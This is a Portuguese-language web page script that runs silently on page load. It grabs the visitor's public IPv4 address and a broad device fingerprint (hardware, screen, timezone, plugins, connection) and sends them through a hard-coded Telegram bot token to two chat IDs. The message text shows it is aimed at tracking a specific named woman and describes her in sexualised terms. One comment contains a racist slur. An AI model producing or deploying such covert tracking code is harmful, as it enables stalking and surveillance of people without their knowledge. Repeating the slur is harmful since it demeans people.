// ================================================
// script.js - Forçando IPv4 e enviando via teleporra
// ================================================

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Mr. Lonely (Sou eu porra)
    "8219025301",   // Luiz (Mono macaco queimado preto escravo)
];

const processedIPs = new Set();

// função desgraçada pra mandar msg alternativa
async function SendCoisa(text) {
    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text })
            });
        } catch (err) {
            // ignorar falhas de fallback
        }
    }
}

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function safeValue(value) {
    if (value === undefined) return 'unknown';
    if (value === null) return 'null';
    if (typeof value === 'function') return 'function';
    if (typeof value === 'object') {
        try {
            return JSON.stringify(value);
        } catch {
            return String(value);
        }
    }
    return String(value);
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown';
    const others = {
        'navigator app_name': safeValue(navigator.appName),
        'navigator app_version': safeValue(navigator.appVersion),
        'user gpu': safeValue(navigator.gpu),
        'user gamepads': safeValue(typeof navigator.getGamepads === 'function' ? navigator.getGamepads() : undefined),
        'storage': safeValue(navigator.storage),
        'java enable?': safeValue(typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : undefined),
        'permissions of site': safeValue(navigator.permissions),
        'cookie enabled?': safeValue(navigator.cookieEnabled),
        'credentials': safeValue(navigator.credentials),
        'plugins': safeValue(navigator.plugins),
        'product': safeValue(navigator.product),
        'connection': safeValue(navigator.connection),
        'online': safeValue(navigator.onLine),
        'vendor': safeValue(navigator.vendor),
    };

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram,
        cpu_cores: navigator.hardwareConcurrency || 'unknown',
        supports_webgl: !!window.WebGLRenderingContext,
        supports_webgl2: !!window.WebGL2RenderingContext,
        supports_touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        supports_service_worker: 'serviceWorker' in navigator,
        supports_webassembly: typeof WebAssembly === 'object',
        supports_websocket: 'WebSocket' in window,
        outros: others
    };
}

function formatOthers(others) {
    return Object.entries(others)
        .map(([key, value]) => `  • ${key}: ${value}`)
        .join('\n');
}

// ==================== PEGAR IPv4 FORÇADO ====================

async function getIPv4({ timeoutMs = 3000 } = {}) {
    const isIPv4 = ip => /^(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)$/.test(ip);

    const fetchWithTimeout = (url, opts = {}) => {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), timeoutMs);
        return fetch(url, { ...opts, signal: controller.signal })
            .finally(() => clearTimeout(id));
    };

    const endpoints = [
        'https://api.ipify.org?format=json',
        'https://api4.my-ip.io/ip.json',
        'https://ipv4.icanhazip.com',
        'https://api4.ipify.org?format=json',
        'https://ipapi.co/json/'
    ];

    for (const url of endpoints) {
        try {
            const res = await fetchWithTimeout(url);
            if (!res.ok) continue;

            const text = await res.text();
            let ip;

            try {
                ip = JSON.parse(text).ip;
            } catch {
                ip = text.trim();
            }

            if (isIPv4(ip)) return ip;
        } catch (e) {
            SendCoisa(`Falha no endpoint ${url}: ${e?.message || e}`);
        }
    }

    SendCoisa('Todos os fallbacks de IPv4 falharam');
    return 'Não capturado';
}

// ==================== MENSAGEM QUANDO ENTRAR ====================
async function sendMessage(ip) {
    ip = ip || 'Não capturado';

    if (processedIPs.has(ip)) {
        return;
    }
    processedIPs.add(ip);

    const device = getDeviceInfo();
    const formattedOthers = formatOthers(device.outros);

    const message = `A 𝐵𝓇𝓊𝓃𝒶 entrou no site slk\n\n` +
                    `sim, pegamos o ip dela (essa gostosa) e outros dados do dispositivo, são esses ai\n\n` +
                    `• Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `• IP (IPv4): ${ip} <<< Pode ser o bot do insta, observe o IP\n` +
                    `• Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n` +
                    `• Núcleos da CPU: ${device.cpu_cores}\n` +
                    `• Suporte a WebGL: ${device.supports_webgl}\n` +
                    `• Suporte a WebGL2: ${device.supports_webgl2}\n` +
                    `• Suporte a Touch: ${device.supports_touch}\n` +
                    `• Suporte a Service Worker: ${device.supports_service_worker}\n` +
                    `• Suporte a WebAssembly: ${device.supports_webassembly}\n` +
                    `• Suporte a WebSocket: ${device.supports_websocket}\n` +
                    `• Outros:\n${formattedOthers}\n\n` +
                    `Bah guri, kakaakak, tmnc to quase morrendo pra fazer esse script`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {
            // ignorar falha de envio
        }
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendMessage(ip);
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();   // Pega IPv4 + envia a mensagem no teleporra
}

init();